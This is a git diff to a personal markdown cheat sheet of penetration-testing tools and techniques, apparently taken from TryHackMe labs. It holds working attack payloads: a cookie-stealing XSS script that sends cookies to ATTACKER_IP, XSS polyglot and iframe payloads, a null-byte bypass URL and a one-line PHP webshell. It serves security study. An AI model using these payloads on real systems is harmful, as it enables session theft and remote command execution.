@@ -52,6 +52,7 @@
 
   - `sudo apt-get install freerdp2-x11`
   - `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.31.212 /u:Administrator /p:'TryH4ckM3!'`
+- [hexeditor](https://www.kali.org/tools/ncurses-hexedit/)
 - 
 
 #### Online Tools
@@ -415,6 +416,7 @@
 - [Postman](https://www.postman.com/)
 - [Burp Suite](https://portswigger.net/burp)
   - [FoxyProxy Standard](https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp)
+- [OWASP ZAP](https://www.zaproxy.org/)
 - [https://github.com/assetnote/kiterunner](https://github.com/assetnote/kiterunner)
 - [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)
 - [https://github.com/owasp-amass/amass](https://github.com/owasp-amass/amass)
@@ -423,6 +425,8 @@
 - [gobuster](https://www.kali.org/tools/gobuster/)
   - Directory Enumeration
     ``gobuster -u MACHINE_IP -w /snap/seclists/current/Discovery/Web-Content/directory-list-1.0.txt``
+  - `+x php,txt,html` will add these extensions to each word while enumerating.
+  - `-t 250`
 - [nikto](https://www.kali.org/tools/nikto/)
 - [nessus](https://www.tenable.com/products/nessus?utm_campaign=gs-{11596512479}-{110256808302}-{537515898656}_00026644_fy23&utm_promoter=tenable-hv-brand-00026644&utm_source=google&utm_term=nessus&utm_medium=cpc&utm_geo=apac&gclid=CjwKCAjw5remBhBiEiwAxL2M94jwwfvyR4FWvmcRZhAz1xxjoaZSZlPskF3mbHCn9c7zI-DdcrOLbBoCn0IQAvD_BwE)
 - Inspect Webhook and HTTP Requests
@@ -430,13 +434,19 @@
 - [Beef](https://beefproject.com/)
 - XSS
   - Blind XSS
+
     - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
   - XSS Polyglot
     ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
   - Cookie Stealing XSS
+
     ```
     </textarea><script>fetch('http://ATTACKER_IP:PORT?cookie=' + btoa(document.cookie) );</script>
     ```
+  - ```
+    <iframe src="javascript:alert(`xss`)"> 
+    ```
+  - 
 - Command Injection
   - [Payload List](https://github.com/payloadbox/command-injection-payload-list)
 - SQLi
@@ -450,6 +460,31 @@
   - Generate Hash: [https://www.srihash.org/](https://www.srihash.org/)
   - ``<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>``
 - [bypass-403](https://github.com/iamj0ker/bypass-403)
+- Poison Null Byte "*%00"*
+  - `http://10.10.91.44/ftp/package.json.bak%2500.md`
+  - By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string.
+- Broken Access Control
+  - Horizontal Privilege Escalation
+    User performing an action or access data of another user with the same level of permissions.
+  - Vertical Privilege Escalation
+    User performing an action or access data of another user with a higher level of permissions.
+- Upload Vulnerabilities
+  - Overwriting Existing Files
+  - Remote Code Execution (RCE)
+    - It's worth noting that in a routed application (i.e. an application where the routes are defined programmatically rather than being mapped to the file-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.
+    - Webshells
+      - `gobuster dir -u SERVER_URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250`
+      - ```
+        <?php echo system($_GET["cmd"]); ?>
+        ```
+    - Reverse/Bind Shells
+      - [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+  - Bypassing Client-Side Filtering
+    - Burp Suite
+  - Bypassing Server-Side Filtering
+    - File Extensions
+    - Magic Numbers
+      - [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
 - 
 
 #### Network Services
